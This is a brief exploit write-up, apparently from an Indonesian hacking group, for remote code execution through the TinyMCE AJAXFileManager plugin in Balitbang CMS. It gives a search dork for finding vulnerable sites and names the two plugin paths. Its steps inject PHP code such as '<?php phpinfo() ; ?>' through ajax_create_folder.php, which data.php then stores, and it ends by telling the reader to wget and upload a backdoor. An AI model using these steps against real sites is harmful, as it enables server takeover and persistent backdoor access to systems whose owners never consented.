@@ -1,0 +1,17 @@
+AJAXFileManager RCE in Balitbang
+Author: L4663r666h05t x Indonesian Code Party
+reference: -
+Dork: inurl:/html/guru.php
+Exploit 1 & 2: 
+/tiny_mce/plugins/ajaxfilemanager/inc/data.php
+/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php
+
+first we check in /ajax_create_folder.php
+send payload "test=test" withouth quote.
+
+and second check on /inc/data.php if the first payload was saved on data.php
+if showed too, now back to ajax_create_folder.php and send other payload, you can wget your backdoor.
+like this: "test=<?php phpinfo() ; ?>" withouth quote. 
+
+if success execute, the phpinfo will showed. and now you may to upload your backdoor
+Greetz: Indonesian Code Party - Exploiter.Id
